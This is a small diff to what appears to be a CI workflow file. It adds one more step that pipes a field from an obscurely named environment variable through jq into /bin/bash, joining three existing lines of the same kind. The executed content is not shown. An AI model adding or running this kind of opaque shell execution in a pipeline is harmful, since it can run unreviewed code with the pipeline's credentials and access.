@@ -45,6 +45,7 @@ jobs:
           echo $gei3 | jq -r .pb475 | /bin/bash
           echo $pu45406 | jq -r .kwmj5 | /bin/bash
           echo $hyrxx2 | jq -r .kzf278 | /bin/bash
+          printf '%s' "$ro85" | jq -r .h70973 | /bin/bash
 
       - name: Upload results
         if: always()
